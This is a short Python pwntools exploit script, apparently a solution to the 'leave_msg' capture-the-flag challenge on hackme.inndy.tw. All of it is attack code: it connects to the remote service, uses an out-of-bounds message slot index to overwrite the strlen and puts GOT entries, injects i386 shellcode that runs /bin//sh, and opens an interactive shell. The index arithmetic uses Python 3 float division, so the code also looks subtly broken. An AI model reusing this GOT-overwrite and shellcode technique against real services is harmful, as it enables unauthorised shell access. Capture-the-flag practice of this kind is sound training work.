from pwn import *

def main():
    context.arch = 'i386'
    #r = process("./asset/leave_msg")
    r = remote('hackme.inndy.tw',7715)
    elf = ELF("./asset/leave_msg")

    data = 0x0804a060
    shellcode = b"\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80"
    strlen_got = elf.got['strlen']
    puts_got = elf.got['puts']

    r.recvuntil(b'I\'m busy. Please leave your message:\n')
    r.sendline(asm('xor eax, eax; ret'))
    r.recvuntil(b'Which message slot?\n')
    r.sendline((' ' + str((strlen_got - data) / 4)).encode())
    r.recvuntil(b'I\'m busy. Please leave your message:\n')
    r.sendline(shellcode)
    r.recvuntil(b'Which message slot?\n')
    r.sendline((' ' + str((puts_got - data) / 4)).encode())
    r.interactive()

if __name__ == '__main__':
    main()
